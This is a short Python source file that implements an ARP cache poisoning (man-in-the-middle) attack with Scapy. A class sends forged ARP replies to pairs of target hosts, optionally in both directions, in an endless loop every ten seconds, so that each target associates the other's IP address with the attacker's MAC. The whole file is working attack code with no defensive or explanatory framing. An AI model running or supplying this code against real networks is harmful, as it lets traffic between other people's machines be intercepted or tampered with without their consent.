from scapy.all import *
import threading

class poisoning():

    def __init__(self, interface, target, target2, ownMAC, direction):
        self.interface = interface
        self.target = target
        self.target2 = target2
        self.ownMAC = ownMAC
        self.direction = direction

    def poisoning(self):
        #Now we will create and send the arp packets which will poison the caches.
        while True:
            for tar1 in self.target:
                for tar2 in self.target2:
                    if((tar1["ip"] != tar2["ip"]) and (tar1["mac"] != tar2["mac"])):
                        arp_packet1 = Ether(src=self.ownMAC) / ARP(psrc=tar2["ip"], hwsrc=self.ownMAC, pdst=tar1["ip"], hwdst=tar1["mac"]) 
                        sendp(arp_packet1, iface=self.interface)
                        if(self.direction == "y"):
                            arp_packet2 = Ether(src=self.ownMAC) / ARP(psrc=tar1["ip"], hwsrc=self.ownMAC, pdst=tar2["ip"], hwdst=tar2["mac"])
                            sendp(arp_packet2, iface=self.interface)
                #waits 10 seconds before the next spoof
            time.sleep(10)

